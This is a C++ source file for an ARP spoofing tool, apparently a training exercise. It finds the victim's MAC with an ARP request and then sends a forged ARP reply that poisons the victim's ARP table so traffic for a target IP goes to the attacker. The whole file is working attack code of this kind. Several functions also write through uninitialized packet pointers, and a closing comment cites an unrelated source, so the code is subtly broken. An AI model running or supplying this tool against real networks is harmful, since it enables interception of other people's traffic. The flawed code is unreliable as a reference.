#include "arpInfector.h"

ArpInfector::ArpInfector(char* device, Ip* sender_ip, Ip* target_ip) : device_(device), victim_ip_(sender_ip), target_ip_(target_ip) {
    handle_ = pcap_open_live(device_, BUFSIZ, 1, 1000, errbuf_);
    my_MAC_ = ArpInfector::get_my_MAC();
}

ArpInfector::~ArpInfector(){
    pcap_close(handle_);
    free(my_MAC_);
    free(victim_MAC_);
}

void ArpInfector::send_arp_request(EthArpPacket* packet) {
    int res = pcap_sendpacket(handle_, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_));
    }
}

Mac* ArpInfector::get_my_MAC() {
    // get MAC addr from /sys/class/net/inteface/address
    std::string device(device_);
    std::ifstream file("/sys/class/net/" + device + "/address");
    if (file.fail()) {
        fprintf(stderr, "ERROR : error opening file!!\n");
        return 0x00;
    }
    std::string MAC_addr;
    std::getline(file, MAC_addr);
    std::cout << "[+] My MAC address is " << MAC_addr << std::endl;
    // return MAC addr
    Mac* my_MAC = (Mac*)malloc(sizeof(Mac)); // learned from mentor gilgil
    *my_MAC = Mac(MAC_addr);
    return my_MAC; // free in callee needed
}

void ArpInfector::get_victim_MAC() {
    Mac* result;
    EthArpPacket *pkt;
	pkt->eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	pkt->eth_.smac_ = *my_MAC_;
	pkt->eth_.type_ = htons(EthHdr::Arp);
	pkt->arp_.hrd_ = htons(ArpHdr::ETHER);
	pkt->arp_.pro_ = htons(EthHdr::Ip4);
	pkt->arp_.hln_ = Mac::SIZE;
	pkt->arp_.pln_ = Ip::SIZE;
	pkt->arp_.op_ = htons(ArpHdr::Request);
	pkt->arp_.smac_ = *my_MAC_;
	pkt->arp_.sip_ = htonl(Ip("8.8.8.8"));
	pkt->arp_.tmac_ = Mac("00:00:00:00:00:00");
	pkt->arp_.tip_ = htonl(*victim_ip_);
    ArpInfector::send_arp_request(pkt);

    std::cout << "[+] Capturing arp reply from victim.." << std::endl;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle_, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle_));
            break;
        }
        
        result = ArpInfector::capture_arp_packet(packet);
        if (result == nullptr) {
            free(result);
            continue;
        }
        else break;
    }
    victim_MAC_ = result;
}

Mac* ArpInfector::capture_arp_packet(const u_char* packet) {
    EthArpPacket* etharp_packet = (EthArpPacket*)packet;
    if (etharp_packet->eth_.type() != 0x0806) return nullptr;
    if (etharp_packet->arp_.sip_ != htonl(*victim_ip_)) return nullptr;
    printf("[*] ARP Reply packet captured!!\n");

    Mac* victim_MAC = (Mac*)malloc(sizeof(Mac));
    *victim_MAC = etharp_packet->arp_.smac_;
    std::cout << "[+] Victim\'s MAC address is " << std::string(*victim_MAC) << std::endl;
    return victim_MAC; // free from callee needed
}

void ArpInfector::infect_victim_ARP_table() {
    EthArpPacket *pkt;
	pkt->eth_.dmac_ = *victim_MAC_;
	pkt->eth_.smac_ = *my_MAC_;
	pkt->eth_.type_ = htons(EthHdr::Arp);
	pkt->arp_.hrd_ = htons(ArpHdr::ETHER);
	pkt->arp_.pro_ = htons(EthHdr::Ip4);
	pkt->arp_.hln_ = Mac::SIZE;
	pkt->arp_.pln_ = Ip::SIZE;
	pkt->arp_.op_ = htons(ArpHdr::Reply);
	pkt->arp_.smac_ = *my_MAC_;
	pkt->arp_.sip_ = htonl(*target_ip_);
	pkt->arp_.tmac_ = *victim_MAC_;
	pkt->arp_.tip_ = htonl(*victim_ip_);

    ArpInfector::send_arp_request(pkt);
    std::cout << "[+] Infected victim.." << std::endl;
}
// reference : https://stackoverflow.com/questions/65675190/implementing-cat-in-linux-system